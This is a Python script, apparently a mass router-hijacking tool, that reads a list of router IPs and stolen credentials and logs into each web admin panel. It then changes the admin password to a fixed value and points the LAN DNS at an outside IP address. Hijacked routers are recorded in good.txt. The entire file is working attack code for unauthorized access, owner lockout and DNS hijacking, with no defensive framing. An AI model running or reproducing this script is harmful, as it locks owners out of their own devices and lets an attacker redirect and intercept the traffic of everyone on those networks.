import requests
import json
import logging
import base64
from template import system_module

DNS = "20.113.131.27"
GOOGLE_DNS = "8.8.4.4"
NEW_PASSWORD = "12qwaszx"
TIMEOUT = 60

logging.basicConfig(filename='out.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def password_encode(password: str):
    out = base64.b64encode(password.encode())
    return out.decode()


def generate_settings(system_module, sysinfo_body, NEW_PASSWORD, password_tpm, DNS, GOOGLE_DNS):
    system_module.update(sysinfo_body.get("lanCfg"))
    system_module["wanMAC"] = sysinfo_body.get("wanAdvCfg").get("macCurrentWan")
    system_module.update(sysinfo_body.get("remoteWeb"))
    system_module["sysTimeZone"] = sysinfo_body.get("sysTime").get("sysTimeZone")
    system_module["autoMaintenanceEn"] = sysinfo_body.get("softWare").get("autoMaintenanceEn")

    system_module["newPwd"] = password_encode(NEW_PASSWORD)
    system_module["oldPwd"] = password_encode(password_tpm)
    system_module["lanDns1"] = DNS
    system_module["lanDns2"] = GOOGLE_DNS
    return system_module


with open("accounts.txt") as f:
    accounts = f.readlines()

for router in accounts:
    tmp = router.rstrip().split(" ")
    ip = tmp[0]
    port = tmp[1]
    login_and_pass = tmp[2]

    rsession = requests.Session()
    login, password_tpm = login_and_pass.rstrip().split(":")

    password = password_encode(password_tpm)

    print(f'Auth: {ip} Used: {password} TimeOut: {TIMEOUT}')
    data = {"password": password}
    try:
        resp = rsession.post(f"http://{ip}:{port}/login/Auth", data, timeout=TIMEOUT, allow_redirects=True)
    except (Exception, requests.Timeout) as e:
        logger.error(e)
        continue
    auth_body = resp.text
    if "Administration" in auth_body:
        try:
            print(f'Get settings: {ip} TimeOut: {TIMEOUT}')
            resp = rsession.get(
                f"http://{ip}:{port}/goform/getSysTools?random=0.5962448474157635&modules=loginAuth,wanAdvCfg,lanCfg,softWare,wifiRelay,sysTime,remoteWeb,isWifiClients,systemInfo",
                timeout=TIMEOUT, allow_redirects=True)
            sysinfo_body = resp.json()

        except (Exception, requests.Timeout) as e:
            print(f'Error Get settings: {ip} TimeOut: {TIMEOUT}')
            logger.error(e)
            continue
        try:
            data_settings = generate_settings(system_module, sysinfo_body, NEW_PASSWORD, password_tpm, DNS, GOOGLE_DNS)
        except:
            print(f"Don't get settings {ip}")
        try:
            print(f'SetUp settings: {ip} TimeOut: {TIMEOUT}')
            resp = rsession.post(
                f"http://{ip}:{port}/goform/setSysTools", data_settings, timeout=TIMEOUT, allow_redirects=True)
        except (Exception, requests.Timeout) as e:
            print(f'Error SetUp settings: {ip} TimeOut: {TIMEOUT}')
            logger.error(e)
            continue
        with open("good.txt", "a") as fh:
            fh.write(f"{ip}@{login}:{NEW_PASSWORD}\n")
    else:
        print(f'Error Auth: {ip} Used: {password} TimeOut: {TIMEOUT}')
        with open("false_auth.txt", "a") as fh:
            fh.write(f"{ip}@{login}:{password_tpm}\n")
